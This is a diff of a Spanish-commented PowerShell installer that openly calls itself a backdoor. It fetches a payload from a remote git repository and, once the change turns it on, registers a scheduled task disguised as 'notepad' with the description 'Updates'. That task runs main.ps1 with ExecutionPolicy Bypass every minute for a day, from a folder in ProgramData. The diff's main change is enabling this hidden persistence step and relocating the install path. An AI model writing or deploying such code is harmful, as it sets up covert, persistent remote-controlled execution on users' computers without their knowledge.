@@ -1,4 +1,5 @@
 # Configuración
+$location_root = $env:ProgramData
 $program_name = "backdoor_program" # Se creara una carpeta con este nombre
 $program_to_execute = "main.ps1" # Programa a ejecutar
 $git_origin = "https://github.com/elcaza/git_backdoor.git"
@@ -6,7 +7,7 @@ $git_origin = "https://github.com/elcaza/git_backdoor.git"
 
 
 $is_git_ready=$false
-$program_location = $env:ProgramFiles+"\"+$program_name
+$program_location = $location_root+"\"+$program_name+"\windows\"
 $git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.windows.1/Git-2.24.0-64-bit.exe"
 
 
@@ -91,17 +92,14 @@ function download_backdoor {
 # }
 
 function load_backdoor {
-	# $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "Set-Location 'C:\Program Files\z'; powershell –ExecutionPolicy Bypass .\main.ps1 ;"
-
-	# $program_location = $env:ProgramFiles+"\"+$program_name
-	$argument_to_execute = "Set-Location " + $program_location +"; powershell –ExecutionPolicy Bypass .\main.ps1 ;"
-
-
-	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_to_execute
 	
+	$argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
+
+	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_execute
+
 	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
-	
-	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"
+
+	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
 }
 
 function start_program{
@@ -109,7 +107,7 @@ function start_program{
 	if( !(check_git) ) {
 		"Creando ubicaciones"
 		# Creando ubicaciones
-		Set-Location $env:ProgramFiles 
+		Set-Location $location_root
 		mkdir $program_name
 		Set-Location $program_name 
 
@@ -149,7 +147,9 @@ function start_program{
 	
 	"Ahora deberia cargar la tarea programada"
 	# Creando tarea programada
-	# load_backdoor
+	load_backdoor
+	"Programa finalizado"
+	sleep -s 2
 }
 
 start_program
